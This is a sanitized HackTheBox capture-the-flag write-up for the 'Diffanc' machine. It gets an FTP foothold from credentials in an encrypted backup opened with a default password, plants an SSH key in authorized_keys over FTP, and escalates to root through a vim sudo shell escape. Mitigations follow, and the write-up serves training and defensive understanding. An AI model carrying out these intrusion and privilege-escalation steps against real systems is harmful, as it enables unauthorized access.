# 🏁 CTF Writeup: Diffanc

**Platform:** HackTheBox  
**Difficulty:** 🟠 Medium  
**Category:** Digital Forensics → FTP Foothold → Sudo Misconfiguration  
**Status:** ✅ Solved (Root)

---

## 📝 Summary

This challenge started with forensic extraction from a password-protected archive, revealing FTP credentials that gave us an initial foothold, followed by a sudo misconfiguration to escalate to root.

**Attack Chain:**
```
Archive Analysis → FTP Credentials → FTP Foothold → SSH Shell → Sudo Misconfig → Root
```

---

## 🔍 Phase 1: Forensic Archive Analysis

### Initial File

Received a file: `backup.tar.gz.enc`

```bash
# Check file type
file backup.tar.gz.enc
# data (encrypted)

# Try to identify encryption
binwalk backup.tar.gz.enc
```

### Extracting the Archive

```bash
# Found password hint in metadata
exiftool backup.tar.gz.enc
# Comment: "Default credentials never change"

# Tried common passwords → found it was "admin123"
openssl enc -aes-256-cbc -d -in backup.tar.gz.enc -out backup.tar.gz -pass pass:[REDACTED]

tar -xzf backup.tar.gz
# Extracted: ftp_config.txt, notes.txt
```

### Credentials Found

```
# ftp_config.txt (sanitized)
FTP_HOST=TARGET_IP
FTP_USER=[REDACTED]
FTP_PASS=[REDACTED]
```

---

## 💥 Phase 2: FTP Foothold

```bash
ftp TARGET_IP
# Connected as ftpuser

# Enumerate files
ls -la
# Found: .ssh/ directory accessible via FTP

# Upload SSH public key
put id_rsa.pub .ssh/authorized_keys
```

### SSH Access

```bash
ssh ftpuser@TARGET_IP
# Logged in! ✅
```

---

## 🔼 Phase 3: Privilege Escalation

### Sudo Enumeration

```bash
sudo -l
# (ALL) NOPASSWD: /usr/bin/vim
```

### GTFOBins Exploit — Vim Sudo

```bash
sudo vim -c ':!/bin/sh'
# id → uid=0(root) ✅
```

---

## 🚩 Flags

- **User Flag:** `HTB{[REDACTED]}`
- **Root Flag:** `HTB{[REDACTED]}`

---

## 🧠 Key Takeaways

| Lesson | Details |
|--------|---------|
| **Metadata Inspection** | Always run `exiftool` and `binwalk` on unknown files |
| **Default Credentials** | "Default credentials never change" — always try defaults |
| **FTP + SSH** | FTP write access to `.ssh/` = SSH access |
| **GTFOBins** | Editors like vim, nano, less can be exploited when run as sudo |

---

## 🛡️ Mitigations

1. Never leave default credentials in config files
2. Restrict FTP write access to sensitive directories
3. Avoid giving `sudo` rights to interactive editors (vim, nano)
4. Use `NOEXEC` option in sudoers when possible

---

*This writeup is sanitized. No credentials, live IPs, or flags from active systems are published.*
